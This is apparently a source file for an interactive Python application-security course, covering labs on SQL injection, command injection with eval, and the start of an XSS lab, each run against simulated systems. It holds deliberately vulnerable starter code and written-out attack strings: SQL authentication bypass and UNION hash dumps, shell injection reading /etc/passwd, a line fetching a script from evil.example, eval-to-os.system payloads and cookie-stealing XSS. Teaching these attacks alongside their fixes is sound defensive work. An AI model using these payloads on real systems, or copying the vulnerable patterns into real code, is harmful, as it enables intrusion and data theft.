/* sudo learn — Python Module 4: AppSec with Python (PY-128..136).
   Same lab format as labs-m3.js. Every lab is "exploit it, then fix it": exploit checks run the ORIGINAL
   vulnerable code (copied into the check), fix checks fire a set of attacks at the learner's version.
   Simulators (in preludes): a fake shell (os.system / subprocess.run), a fake browser (browser(html)),
   and make_db() for a real in-memory SQLite database. Drills are in drills-m4.js. */
(function () {
  "use strict";
  var T = window.PY_TRACK;
  var py = T.py;
  function ex(code) { return '<pre class="ex">' + esc(code) + "</pre>"; }
  function esc(s) { return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
  function lines() { return Array.prototype.slice.call(arguments).join("\n") + "\n"; }
  var NL = "\n\n";

  var LABS = [];

  /* ------------------------------------------------------------------ Simulators */
  // A pretend shell. os.system and subprocess.run are replaced, so nothing real ever runs.
  // Every command that "runs" is printed as "+ command" and logged in sys._sl_shell_log for checks.
  var FAKE_SHELL = py`
    import sys as _sys


    def _install_shell():
        import os, re, shlex, subprocess
        log = _sys.__dict__.setdefault("_sl_shell_log", [])
        files = {"/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmaya:x:1000:1000:Maya Chen:/home/maya:/bin/bash",
                 "/etc/hostname": "support-web-01"}
        host_ok = re.compile(r"[A-Za-z0-9]([A-Za-z0-9.:-]*[A-Za-z0-9])?")

        def run_one(words):
            if not words:
                return "", 0
            cmd, args = words[0], words[1:]
            log.append(" ".join(words))
            print("+ " + " ".join(words))
            if cmd == "ping":
                rest = [a for a in args if not a.startswith("-")]
                flags = [a for a in args if a.startswith("-")]
                if "-f" in flags:
                    return "ping: flood mode: sending packets as fast as possible...", 0
                host = rest[-1] if rest else ""
                if host and host_ok.fullmatch(host) and not host[0] == "-":
                    return "PING " + host + ": 1 packets transmitted, 1 received, 0% packet loss", 0
                return "ping: " + (host or "usage error") + ": Name or service not known", 2
            if cmd == "cat":
                outs = [files.get(a, "cat: " + a + ": No such file or directory") for a in args]
                return "\n".join(outs), 0 if all(a in files for a in args) else 1
            if cmd == "whoami":
                return "www-data", 0
            if cmd == "id":
                return "uid=33(www-data) gid=33(www-data) groups=33(www-data)", 0
            if cmd == "hostname":
                return files["/etc/hostname"], 0
            if cmd == "ls":
                return "app.py  config  static", 0
            if cmd == "echo":
                return " ".join(args), 0
            if cmd in ("curl", "wget"):
                return "(downloaded " + (args[-1] if args else "?") + ")", 0
            if cmd in ("sh", "bash"):
                return "(ran a script as www-data)", 0
            return "sh: 1: " + cmd + ": not found", 127

        def run_line(line):
            def sub(m):
                out, _ = run_line(m.group(1) if m.group(1) is not None else m.group(2))
                return out.strip()
            line = re.sub(r"\$\(([^()]*)\)|\x60([^\x60]*)\x60", sub, line)
            outs, code = [], 0
            for part in re.split(r"\|\||&&|;|\||\n", line):
                part = part.strip()
                if not part:
                    continue
                try:
                    words = shlex.split(part)
                except ValueError:
                    words = part.split()
                out, code = run_one(words)
                if out:
                    outs.append(out)
            return "\n".join(outs), code

        def system(command):
            out, code = run_line(str(command))
            if out:
                print(out)
            return code

        def run(args, *a, shell=False, capture_output=False, text=False, check=False, timeout=None, **kw):
            if shell:
                out, code = run_line(args if isinstance(args, str) else " ".join(args))
            elif isinstance(args, str):
                raise FileNotFoundError(2, "No such file or directory: " + repr(args) + " (without shell=True, pass a list like [\"ping\", \"-c\", \"1\", host])")
            else:
                out, code = run_one([str(x) for x in args])
            stdout = None
            if capture_output:
                stdout = out + "\n" if out else ""
                if not text:
                    stdout = stdout.encode()
            elif out:
                print(out)
            cp = subprocess.CompletedProcess(args, code, stdout, "" if capture_output else None)
            if check and code:
                raise subprocess.CalledProcessError(code, args, output=stdout)
            return cp

        # Pretend to be the real functions, so pickle and yaml find them by name.
        system.__module__, system.__name__, system.__qualname__ = "os", "system", "system"
        run.__module__, run.__name__, run.__qualname__ = "subprocess", "run", "run"
        os.system = system
        subprocess.run = run


    _install_shell()
    del _install_shell, _sys
  `;

  // A pretend browser: prints the page's visible text and every piece of JavaScript that would run.
  var FAKE_BROWSER = py`
    def _install_browser():
        import re
        from html.parser import HTMLParser

        class Page(HTMLParser):
            def __init__(self):
                super().__init__(convert_charrefs=True)
                self.scripts, self.text, self.in_script = [], [], False

            def handle_starttag(self, tag, attrs):
                if tag == "script":
                    self.in_script = True
                for name, value in attrs:
                    v = value or ""
                    url = re.sub(r"[\x00-\x20]", "", v).lower()
                    if name.startswith("on"):
                        self.scripts.append(name + "=" + v)
                    elif name in ("href", "src", "action", "formaction") and url.startswith(("javascript:", "data:text/html")):
                        self.scripts.append(name + "=" + v)

            def handle_endtag(self, tag):
                if tag == "script":
                    self.in_script = False

            def handle_data(self, data):
                if self.in_script:
                    self.scripts.append("<script>" + data)
                elif data.strip():
                    self.text.append(data.strip())

        def browser(html):
            """Show what a browser does with this HTML: the visible text, then any JavaScript that would run."""
            p = Page()
            p.feed(str(html))
            p.close()
            print("page shows: " + " ".join(p.text))
            for s in p.scripts:
                print("  JavaScript runs: " + s)
            if not p.scripts:
                print("  (no JavaScript runs)")
            return p.scripts

        return browser


    browser = _install_browser()
    del _install_browser
  `;

  // Kestrel's customer database: a real SQLite database in memory.
  var MAKE_DB = py`
    def make_db():
        """Kestrel's customer database for this lab (SQLite, in memory): tables users and orders."""
        import sqlite3, hashlib
        db = sqlite3.connect(":memory:")
        db.execute("CREATE TABLE users (username TEXT, password_hash TEXT, role TEXT)")
        db.execute("CREATE TABLE orders (id INTEGER, customer TEXT, item TEXT)")
        for user, pw, role in [("admin", "Adm!n-2026-kestrel", "admin"), ("maya", "correct horse", "sre"),
                               ("ana", "sunflower88", "customer"), ("o'brien", "shamrock", "customer")]:
            db.execute("INSERT INTO users VALUES (?, ?, ?)", (user, hashlib.sha256(pw.encode()).hexdigest(), role))
        db.executemany("INSERT INTO orders VALUES (?, ?, ?)",
                       [(1, "ana", "Starter plan"), (2, "ana", "Extra storage"), (3, "o'brien", "Pro plan"), (4, "maya", "Team plan")])
        db.commit()
        return db
  `;

  // Check-side helpers.
  var SHELL_CHECK = py`
    import sys as _s, io as _io, contextlib as _cl

    def ran(fn, *args):
        """Call fn quietly; returns (ok, result_or_exception, [commands the fake shell ran])."""
        log = _s.__dict__.setdefault("_sl_shell_log", [])
        del log[:]
        try:
            with _cl.redirect_stdout(_io.StringIO()):
                return True, fn(*args), list(log)
        except Exception as e:
            return False, e, list(log)
  ` + NL;

  var BROWSER_CHECK = py`
    import re as _re
    from html.parser import HTMLParser as _HP

    def scripts_in(html):
        found = []
        state = {"in": False}
        class P(_HP):
            def handle_starttag(self, tag, attrs):
                if tag == "script":
                    state["in"] = True
                for name, value in attrs:
                    v = value or ""
                    url = _re.sub(r"[\x00-\x20]", "", v).lower()
                    if name.startswith("on") or (name in ("href", "src", "action", "formaction") and url.startswith(("javascript:", "data:text/html"))):
                        found.append(name + "=" + v)
            def handle_endtag(self, tag):
                if tag == "script":
                    state["in"] = False
            def handle_data(self, data):
                if state["in"]:
                    found.append("<script>" + data)
        p = P(convert_charrefs=True)
        p.feed(str(html))
        p.close()
        return found
  ` + NL;

  /* ================================================================== PY-128 */
  var SQL_CHECK = py`
    import hashlib as _hl

    def vuln_login(db, username, password):
        h = _hl.sha256(password.encode()).hexdigest()
        query = "SELECT role FROM users WHERE username = '" + username + "' AND password_hash = '" + h + "'"
        row = db.execute(query).fetchone()
        return row[0] if row else None

    def vuln_search(db, customer):
        return db.execute("SELECT id, item FROM orders WHERE customer = '" + customer + "'").fetchall()

    ATTACKS = ["admin' --", "admin'--", "' OR '1'='1' --", "' OR 1=1 --", "admin' OR '1'='1", "x' UNION SELECT 'admin' --"]
  ` + NL;

  LABS.push({
    id: "py-128", n: 28, module: 4, ticket: "PY-128", xp: 100,
    title: "Log in as anyone",
    topic: "SQL injection: exploit & fix",
    from: "Dev Patel · Security",
    story: "<p>Before we put the old customer portal behind the new login system, I'm doing a quick penetration test of it, and you're on my team today. Its login and order search build their SQL by gluing strings together.</p>" +
      "<p>Prove it's exploitable: log in as <code>admin</code> without the password, then pull every password hash out of the database. Then fix both functions so neither attack works.</p>" +
      '<p class="dim">Only ever test systems you own or have written permission to test. Everything here runs against a database inside your browser.</p>',
    learn:
      '<div class="callout"><b>Database in this lab:</b> <code>make_db()</code> builds Kestrel\'s customer database, a real SQLite database in memory, with tables <code>users(username, password_hash, role)</code> and <code>orders(id, customer, item)</code>. The first Run downloads SQLite (first time only).</div>' +
      "<h3>SQL in 30 seconds</h3><p>SQL is the language databases speak. Python sends it as a string with <code>db.execute(query)</code>:</p>" +
      ex('db = make_db()\nprint(db.execute("SELECT username, role FROM users").fetchall())\nprint(db.execute("SELECT item FROM orders WHERE customer = \'ana\'").fetchall())') +
      "<p><code>'ana'</code> in quotes is a text value. <code>--</code> starts a comment: the database ignores the rest of the line.</p>" +
      "<h3>How injection happens</h3><p>When code builds the query with an f-string, whatever the user typed becomes <b>part of the SQL code</b>. Look at the query a login form builds when someone types a quote:</p>" +
      ex("username = \"admin' --\"\nquery = f\"SELECT role FROM users WHERE username = '{username}' AND password_hash = '...'\"\nprint(query)") +
      "<p>The quote closes the text early, and <code>--</code> comments out the password check. The database sees <code>WHERE username = 'admin'</code> and nothing else. That's SQL injection: the attacker's data has become your code.</p>" +
      "<h3>UNION: reading other tables</h3><p><code>UNION SELECT</code> glues the rows of a second query onto the first. If the first query returns 2 columns, the attacker's must too:</p>" +
      ex('db = make_db()\nprint(db.execute("SELECT id, item FROM orders WHERE customer = \'nobody\' UNION SELECT username, role FROM users").fetchall())') +
      "<h3>The fix: parameterized queries</h3><p>Put a <code>?</code> where each value goes and pass the values separately. The database receives the SQL and the data <b>separately</b>, so data can never be read as code, whatever characters it contains:</p>" +
      ex('db = make_db()\nname = "admin\' --"\nprint(db.execute("SELECT role FROM users WHERE username = ?", (name,)).fetchall())\nprint(db.execute("SELECT role FROM users WHERE username = ?", ("maya",)).fetchall())') +
      "<p>Note the comma in <code>(name,)</code>: the values are always a tuple, even when there's only one.</p>" +
      '<div class="callout warn"><b>Don\'t fix it by removing quotes.</b> Filtering characters breaks real users (Kestrel has a customer called <code>o\'brien</code>) and attackers find ways around filters. Parameters are the fix.</div>',
    starter: py`
      # PY-128 · Log in as anyone
      import hashlib

      db = make_db()


      def login(username, password):
          """Return the user's role if the username and password are right, otherwise None."""
          h = hashlib.sha256(password.encode()).hexdigest()
          query = f"SELECT role FROM users WHERE username = '{username}' AND password_hash = '{h}'"
          row = db.execute(query).fetchone()
          return row[0] if row else None


      def search_orders(customer):
          """The support page's order search: (id, item) rows for one customer."""
          query = f"SELECT id, item FROM orders WHERE customer = '{customer}'"
          return db.execute(query).fetchall()


      print(login("maya", "correct horse"))
      print(search_orders("ana"))

      # 1) Exploit: a username that logs in as admin, whatever the password
      evil_username = ""

      # 2) Exploit: a customer value that makes search_orders return every
      #    username and password_hash from the users table
      evil_customer = ""

      # 3-4) Then fix login and search_orders
    `,
    prelude: MAKE_DB,
    objectives: [
      {
        id: "bypass",
        text: "<b>Exploit:</b> set <code>evil_username</code> so the original <code>login(evil_username, \"anything\")</code> returns <code>\"admin\"</code>.",
        hints: ["End the username's text value with a quote, then comment out the rest of the query with --. Try printing the query to see what the database receives.",
          "evil_username = \"admin' --\""],
        check: SQL_CHECK + py`
          def check(ns, out, run, src):
              u = ns.get("evil_username")
              if not u:
                  return "Set evil_username to your attack string."
              shown = "SELECT role FROM users WHERE username = '" + u + "' AND password_hash = '...'"
              for pw in ["anything", "x"]:
                  ok, got = H.call(vuln_login, ns["make_db"](), u, pw)
                  if not ok:
                      return "The database rejected the query:\n  " + shown + "\n" + type(got).__name__ + ": " + str(got) + "\nTip: -- comments out everything after it."
                  if got != "admin":
                      return "With evil_username = " + repr(u) + " the query is:\n  " + shown + "\nand login returned " + H.short(got) + ", not \"admin\"."
              return True
        `
      },
      {
        id: "union",
        text: "<b>Exploit:</b> set <code>evil_customer</code> so the original <code>search_orders(evil_customer)</code> returns every row of <code>users</code> as <code>(username, password_hash)</code>.",
        hints: ["Close the quote, add UNION SELECT with exactly 2 columns from users, and comment out the leftover quote with --.",
          "evil_customer = \"' UNION SELECT username, password_hash FROM users --\""],
        check: SQL_CHECK + py`
          def check(ns, out, run, src):
              c = ns.get("evil_customer")
              if not c:
                  return "Set evil_customer to your attack string."
              db = ns["make_db"]()
              ok, rows = H.call(vuln_search, db, c)
              shown = "SELECT id, item FROM orders WHERE customer = '" + c + "'"
              if not ok:
                  msg = str(rows)
                  extra = "\n(Both SELECTs need the same number of columns: 2.)" if "columns" in msg else ""
                  return "The database rejected:\n  " + shown + "\n" + type(rows).__name__ + ": " + msg + extra
              want = set(db.execute("SELECT username, password_hash FROM users").fetchall())
              if not want <= set(tuple(r) for r in rows):
                  return "The query was:\n  " + shown + "\nIt returned " + H.short(rows, 200) + "\nIt should include (username, password_hash) for all 4 users."
              return True
        `
      },
      {
        id: "fixlogin",
        text: "<b>Fix</b> <code>login</code> with a parameterized query. Real logins (including <code>o'brien</code> / <code>shamrock</code>) must still work, and every injection attempt must return <code>None</code>.",
        hints: ["Replace the f-string with ? placeholders and pass (username, h) as the second argument to db.execute.",
          'def login(username, password):\n    h = hashlib.sha256(password.encode()).hexdigest()\n    row = db.execute(\n        "SELECT role FROM users WHERE username = ? AND password_hash = ?", (username, h)\n    ).fetchone()\n    return row[0] if row else None'],
        check: SQL_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "login")
              if not f:
                  return "I can't find login."
              for u, pw, want in [("maya", "correct horse", "sre"), ("ana", "sunflower88", "customer"), ("o'brien", "shamrock", "customer"), ("maya", "wrong", None), ("nobody", "x", None)]:
                  ok, got = H.call(f, u, pw)
                  if not ok:
                      return "login(" + repr(u) + ", " + repr(pw) + ") crashed: " + type(got).__name__ + ": " + str(got) + ("\nReal names can contain quotes: use ? parameters instead of building the SQL text." if "'" in u else "")
                  if got != want:
                      return "login(" + repr(u) + ", " + repr(pw) + ") should return " + repr(want) + ", got " + H.short(got) + "."
              for attack in ATTACKS:
                  ok, got = H.call(f, attack, "x")
                  if not ok or got is not None:
                      return "Injection still works: login(" + repr(attack) + ", \"x\") " + ("crashed with " + type(got).__name__ if not ok else "returned " + repr(got)) + ". Use ? placeholders so the input can't change the SQL."
              return True
        `
      },
      {
        id: "fixsearch",
        text: "<b>Fix</b> <code>search_orders</code> the same way. Normal searches must still work, and the UNION attack must return no rows.",
        hints: ["One ? for the customer, and (customer,) as the parameters. Mind the comma.",
          'def search_orders(customer):\n    return db.execute("SELECT id, item FROM orders WHERE customer = ?", (customer,)).fetchall()'],
        check: SQL_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "search_orders")
              if not f:
                  return "I can't find search_orders."
              for c, want in [("ana", [(1, "Starter plan"), (2, "Extra storage")]), ("o'brien", [(3, "Pro plan")]), ("zed", [])]:
                  ok, got = H.call(f, c)
                  if not ok:
                      return "search_orders(" + repr(c) + ") crashed: " + type(got).__name__ + ": " + str(got)
                  if [tuple(r) for r in got] != want:
                      return "search_orders(" + repr(c) + ") should return " + repr(want) + ", got " + H.short(got) + "."
              for attack in ["' UNION SELECT username, password_hash FROM users --", "' OR '1'='1", "ana' OR 1=1 --"]:
                  ok, got = H.call(f, attack)
                  if not ok or list(got) != []:
                      return "Injection still works: search_orders(" + repr(attack) + ") " + ("crashed" if not ok else "returned " + H.short(got, 120)) + ". Use a ? placeholder."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed, and the pen-test report writes itself: <b>full authentication bypass and a dump of every password hash</b>, from two text boxes. Both are fixed with the same one-line habit: never build SQL with f-strings, <code>+</code> or <code>%</code>, always use parameters.</p>" +
      "<p>Those leaked hashes are plain unsalted SHA-256, by the way. Hold that thought until PY-134.</p>",
    realworld: "SQL injection has caused some of the biggest breaches on record, and it's still in the OWASP Top 10 under A03 Injection. The same rule applies everywhere: psycopg (PostgreSQL) uses %s placeholders, ORMs like SQLAlchemy and Django parameterize for you, and tools like bandit (B608) and semgrep flag string-built SQL. The Module 4 capstone does exactly that.",
    quiz: [
      { q: "Why does <code>admin' --</code> log in without a password?", options: ["It's the admin's real password", "The quote ends the text value and -- comments out the password check", "SQLite has no passwords", "It crashes the database"], answer: 1,
        why: "The input changed the structure of the query, not just a value in it." },
      { q: "What's the right fix for SQL injection?", options: ["Remove quotes from the input", "Use a longer password", "Parameterized queries: ? placeholders with the values passed separately", "Make usernames uppercase"], answer: 2,
        why: "With parameters, the database never parses the data as SQL. Filtering breaks real names and can be bypassed." },
      { q: "<code>db.execute(\"... WHERE customer = ?\", (customer))</code> — what's wrong?", options: ["Nothing", "(customer) isn't a tuple; it needs a comma: (customer,)", "? should be %s", "You can't use WHERE with ?"], answer: 1,
        why: "Parentheses alone don't make a tuple. A string would be treated as a sequence of single characters." }
    ]
  });

  /* ================================================================== PY-129 */
  var CMD_CHECK = SHELL_CHECK + py`
    def vuln_ping(host):
        import os
        return os.system("ping -c 1 " + host)

    def vuln_settings(text):
        return eval(text)

    def others(log):
        return [c for c in log if not c.startswith("ping")]
  ` + NL;

  LABS.push({
    id: "py-129", n: 29, module: 4, ticket: "PY-129", xp: 100,
    title: "The ping tool",
    topic: "Command injection & eval",
    from: "Dev Patel · Security",
    story: "<p>The support site has a handy page: type a hostname, it pings it and shows whether it's up. Under the hood, the Python passes your text straight to the shell. Next to it, a capacity planner turns settings text into a dict with <code>eval()</code>.</p>" +
      "<p>Show me what an attacker can run through each of them, then make both safe.</p>",
    learn:
      '<div class="callout"><b>A simulated shell.</b> Browsers can\'t run real commands, so in this lab <code>os.system</code> and <code>subprocess.run</code> go to a pretend Linux shell. It prints every command it runs as <code>+ command</code>, so you can see exactly what executed.</div>' +
      "<h3>The shell reads more than you think</h3><p><code>os.system(text)</code> hands the whole string to a shell, and the shell treats some characters as instructions:</p>" +
      '<table class="t"><tr><th>Syntax</th><th>Means</th></tr>' +
      "<tr><td><code>a ; b</code></td><td>run a, then b</td></tr><tr><td><code>a &amp;&amp; b</code> / <code>a || b</code></td><td>run b if a succeeded / failed</td></tr>" +
      "<tr><td><code>a | b</code></td><td>send a's output into b</td></tr><tr><td><code>$(b)</code> or <code>`b`</code></td><td>run b first and paste its output in</td></tr></table>" +
      ex('import os\n\nos.system("ping -c 1 8.8.8.8")\nos.system("echo hello; whoami")') +
      "<p>So if user input goes into that string, the user can add commands of their own. That's <b>command injection</b>, and the commands run with the web server's permissions.</p>" +
      "<h3>Fix 1: no shell. Pass a list.</h3><p><code>subprocess.run([\"ping\", \"-c\", \"1\", host])</code> starts <code>ping</code> directly with each list item as one argument. No shell is involved, so <code>;</code> and <code>$( )</code> are just characters in a weird hostname.</p>" +
      ex('import subprocess\n\nr = subprocess.run(["ping", "-c", "1", "8.8.8.8; whoami"], capture_output=True, text=True, timeout=10)\nprint(r.returncode, r.stdout)') +
      "<h3>Fix 2: validate the input</h3><p>Even without a shell, a value starting with <code>-</code> becomes an <b>option</b>: <code>ping -f</code> is a flood. Check that the input is what you expect, and reject everything else. The <code>ipaddress</code> module knows what a valid IP is:</p>" +
      ex('import ipaddress\n\nfor text in ["8.8.8.8", "2001:db8::1", "8.8.8.8; id", "-f"]:\n    try:\n        print(text, "->", ipaddress.ip_address(text))\n    except ValueError:\n        print(text, "-> not an IP address")') +
      "<p>For hostnames, an allowlist regex: letters, digits, dots and hyphens, not starting with a hyphen: <code>re.fullmatch(r\"[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?\", host)</code>.</p>" +
      "<h3>eval() runs any Python</h3><p><code>eval(text)</code> doesn't just read values: it runs the text as Python code, including <code>__import__(\"os\").system(...)</code>. To turn text like <code>{'replicas': 3}</code> into a dict, use <code>ast.literal_eval</code>, which only accepts literal values (numbers, strings, lists, dicts, True/False/None) and refuses anything that would run code.</p>" +
      ex('import ast\n\nprint(ast.literal_eval("{\'replicas\': 3, \'debug\': False}"))\nprint(ast.literal_eval("__import__(\'os\').system(\'whoami\')"))'),
    starter: py`
      # PY-129 · The ping tool
      import ast
      import ipaddress
      import os
      import re
      import subprocess


      def ping(host):
          """Check that a host is up. The support web form passes in whatever the user typed."""
          return os.system(f"ping -c 1 {host}")


      def parse_settings(text):
          """Capacity planner settings arrive as text like "{'replicas': 3, 'region': 'ap-southeast-2'}"."""
          return eval(text)


      ping("8.8.8.8")

      # 1) Exploit: a host value that makes ping() also run: cat /etc/passwd
      evil_host = ""

      # 4) Exploit: a settings text that makes parse_settings() run a shell command
      evil_settings = ""
    `,
    prelude: FAKE_SHELL,
    objectives: [
      {
        id: "inject",
        text: "<b>Exploit:</b> set <code>evil_host</code> so the original <code>ping(evil_host)</code> also runs <code>cat /etc/passwd</code>.",
        hints: ["Give ping a real host, then use ; to start a second command.", 'evil_host = "8.8.8.8; cat /etc/passwd"'],
        check: CMD_CHECK + py`
          def check(ns, out, run, src):
              h = ns.get("evil_host")
              if not h:
                  return "Set evil_host to your attack string."
              ok, got, log = ran(vuln_ping, h)
              if not any(c.startswith("cat /etc/passwd") for c in log):
                  return "With evil_host = " + repr(h) + " the shell received:\n  ping -c 1 " + h + "\nand ran: " + (", ".join(log) or "nothing") + "\nMake it also run cat /etc/passwd."
              return True
        `
      },
      {
        id: "noshell",
        text: "<b>Fix:</b> make <code>ping</code> call <code>subprocess.run</code> with a <b>list</b> of arguments (no shell) and a <code>timeout</code>, and return the exit code. No input may run any command except <code>ping</code>.",
        hints: ["subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True, timeout=10) returns a result; .returncode is the exit code.",
          'def ping(host):\n    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=10)\n    return result.returncode'],
        check: CMD_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "ping")
              if not f:
                  return "I can't find ping."
              ok, got, log = ran(f, "8.8.8.8")
              if not ok:
                  return "ping(\"8.8.8.8\") crashed: " + type(got).__name__ + ": " + str(got)
              if got != 0 or log != ["ping -c 1 8.8.8.8"]:
                  return "ping(\"8.8.8.8\") should run exactly ping -c 1 8.8.8.8 and return 0. It ran " + H.short(log) + " and returned " + H.short(got) + "."
              for attack in ["8.8.8.8; cat /etc/passwd", "8.8.8.8 && whoami", "$(whoami)", "8.8.8.8 | curl http://evil.example/x.sh", "8.8.8.8\nid"]:
                  ok, got, log = ran(f, attack)
                  bad = others(log)
                  if bad:
                      return "Injection still works: ping(" + repr(attack) + ") ran " + ", ".join(bad) + ". Pass a list to subprocess.run, with no shell=True."
              if "shell=True" in src:
                  return "Remove shell=True: it brings the shell (and the injection) back."
              if "timeout" not in src:
                  return "Give subprocess.run a timeout=, so a hung command can't block the web server forever."
              return True
        `
      },
      {
        id: "validate",
        text: "<b>Fix:</b> <code>ping</code> raises <code>ValueError</code> unless the host is an IP address (<code>ipaddress.ip_address</code>) or a hostname made of letters, digits, dots and hyphens that doesn't start with <code>-</code>.",
        hints: ["Write a helper valid_host(host): try ipaddress.ip_address(host) and return True; on ValueError, return whether the hostname regex fullmatches. In ping: if not valid_host(host): raise ValueError(...).",
          'HOSTNAME = re.compile(r"[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?")\n\ndef valid_host(host):\n    try:\n        ipaddress.ip_address(host)\n        return True\n    except ValueError:\n        return bool(HOSTNAME.fullmatch(host))\n\ndef ping(host):\n    if not valid_host(host):\n        raise ValueError(f"not a valid host: {host!r}")\n    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=10)\n    return result.returncode'],
        check: CMD_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "ping")
              if not f:
                  return "I can't find ping."
              for good in ["8.8.8.8", "2001:db8::1", "web-01.kestrel.io", "localhost"]:
                  ok, got, log = ran(f, good)
                  if not ok:
                      return "ping(" + repr(good) + ") should be allowed, but raised " + type(got).__name__ + ": " + str(got)
              for bad in ["-f", "-c 100000 8.8.8.8", "8.8.8.8; cat /etc/passwd", "", "web-01.kestrel.io && id", "--help", "$(whoami)"]:
                  ok, got, log = ran(f, bad)
                  if ok:
                      return "ping(" + repr(bad) + ") was accepted (it ran: " + (", ".join(log) or "nothing") + "). Raise ValueError for anything that isn't an IP address or a plain hostname."
                  if not isinstance(got, ValueError):
                      return "ping(" + repr(bad) + ") raised " + type(got).__name__ + ", but it should raise ValueError."
                  if log:
                      return "ping(" + repr(bad) + ") ran " + ", ".join(log) + " before rejecting it. Validate first, then run."
              return True
        `
      },
      {
        id: "evalpwn",
        text: "<b>Exploit:</b> set <code>evil_settings</code> so the original <code>parse_settings(evil_settings)</code> runs a shell command through <code>os.system</code>.",
        hints: ["eval runs any expression. __import__(\"os\") gives you the os module without an import statement.",
          "evil_settings = '__import__(\"os\").system(\"whoami\")'"],
        check: CMD_CHECK + py`
          def check(ns, out, run, src):
              t = ns.get("evil_settings")
              if not t:
                  return "Set evil_settings to your attack string."
              ok, got, log = ran(vuln_settings, t)
              if not log:
                  return "parse_settings(" + repr(t) + ") " + ("raised " + type(got).__name__ + ": " + str(got) if not ok else "returned " + H.short(got)) + ", but ran no shell command. Call os.system from inside the expression."
              return True
        `
      },
      {
        id: "literal",
        text: "<b>Fix:</b> <code>parse_settings</code> uses <code>ast.literal_eval</code>, so real settings still parse but code is rejected (it raises an error and runs nothing).",
        hints: ["One line: return ast.literal_eval(text).", "def parse_settings(text):\n    return ast.literal_eval(text)"],
        check: CMD_CHECK + py`
          def check(ns, out, run, src):
              f = H.fn(ns, "parse_settings")
              if not f:
                  return "I can't find parse_settings."
              text = "{'replicas': 3, 'region': 'ap-southeast-2', 'debug': False, 'zones': ['a', 'b']}"
              ok, got, log = ran(f, text)
              if not ok or got != {"replicas": 3, "region": "ap-southeast-2", "debug": False, "zones": ["a", "b"]}:
                  return "parse_settings should still turn " + text + " into a dict, got " + (type(got).__name__ + ": " + str(got) if not ok else H.short(got)) + "."
              for attack in ['__import__("os").system("whoami")', "open('/etc/passwd').read()", "[].__class__.__base__.__subclasses__()", "(lambda: 1)()"]:
                  ok, got, log = ran(f, attack)
                  if ok or log:
                      return "parse_settings(" + repr(attack) + ") still ran code" + (" (shell ran: " + ", ".join(log) + ")" if log else ", returning " + H.short(got)) + ". Use ast.literal_eval."
              return True
        `
      }
    ],
    debrief: "<p>Ticket closed. Through a <b>ping box</b>, an attacker could read files, download and run scripts, and use the web server as a foothold into the network. Now commands run without a shell, inputs are checked against an allowlist, and settings are parsed as data instead of executed as code.</p>" +
      "<p>The pattern is the same as SQL injection: <b>keep data and code apart</b>. A list instead of a shell string, <code>?</code> instead of an f-string, <code>literal_eval</code> instead of <code>eval</code>.</p>",
    realworld: "bandit flags os.system (B605), subprocess with shell=True (B602) and eval (B307). If you truly need shell features, shlex.quote() escapes one value, but a list of arguments is simpler and safer. Command injection in network devices' web consoles (\"diagnostics\" pages just like this one) is one of the most-exploited bug classes on the internet.",
    quiz: [
      { q: "Why is <code>subprocess.run([\"ping\", \"-c\", \"1\", host])</code> safe from <code>; whoami</code>?", options: ["subprocess filters semicolons", "No shell is involved, so ; is just a character in one argument", "ping ignores extra text", "It isn't safe"], answer: 1,
        why: "Only a shell gives ; | && $( ) special meaning. A list goes straight to the program." },
      { q: "With a list and no shell, what can a host of <code>-f</code> still do?", options: ["Nothing", "Become an option to ping (flood mode): argument injection", "Run a new command", "Crash Python"], answer: 1,
        why: "That's why you validate inputs too, even without a shell." },
      { q: "What does <code>ast.literal_eval</code> accept?", options: ["Any Python expression", "Only literal values: numbers, strings, lists, dicts, tuples, sets, booleans and None", "Only JSON", "Only numbers"], answer: 1,
        why: "No function calls, no names, no attribute access, so nothing can execute." }
    ]
  });

  /* ================================================================== PY-130 */
  LABS.push({
    id: "py-130", n: 30, module: 4, ticket: "PY-130", xp: 100,
    title: "The comments page",
    topic: "Cross-site scripting (XSS)",
    from: "Dev Patel · Security",
    story: "<p>The new community page lets customers post comments and link their website, and our Python builds the HTML with f-strings. Every comment is shown to <b>everyone</b> who opens the page, including our support staff, who are logged in with admin rights.</p>" +
      "<p>If someone can make a comment run JavaScript, it runs in every visitor's browser and can act as them. Show me it's possible, then shut it down.</p>",
    learn:
      '<div class="callout"><b>A simulated browser.</b> <code>browser(html)</code> shows what a browser would do with some HTML: the text a visitor sees, and every piece of JavaScript that would run. Use it to test your attacks and fixes.</div>' +
      "<h3>When text becomes code</h3><p>HTML mixes content with markup. If user text is pasted into HTML as-is, any <code>&lt;tags&gt;</code> in it become real tags, including ones that run JavaScript:</p>" +
      ex('comment = "Nice post!"\nbrowser(f"<p>{comment}</p>")\n\ncomment = "<b>Nice</b> <img src=x onerror=alert(document.cookie)>"\nbrowser(f"<p>{comment}</p>")') +
      "<p>That's <b>cross-site scripting (XSS)</b>. The script runs on <em>our</em> site, so it can read the page, act as the logged-in user, or steal their session.</p>" +
      "<h3>The fix: escape on output</h3><p><code>html.escape</code> turns the special characters into <b>entities</b> that display as the character but never act as markup: <code>&lt;</code> becomes <code>&amp;lt;</code>, <code>&amp;</code> becomes <code>&amp;amp;</code>, and quotes become <code>&amp;quot;</code> and <code>&amp;#x27;</code>.</p>" +
      ex('import html\n\nevil = "<img src=x onerror=alert(1)>"\nsafe = html.escape(evil)\nprint(safe)\nbrowser(f"<p>{safe}</p>")') +
      "<p>Escape <b>every</b> value that came from a user, at the moment you put it into HTML, including names, not just the obvious comment box.</p>" +
      "<h3>Attributes and URLs</h3><p>Inside an attribute, the value must also not be able to close the quote, which <code>html.escape</code> handles. But a link's address is a special case: <code>javascript:</code> URLs run code when clicked, and escaping doesn't change them at all:</p>" +
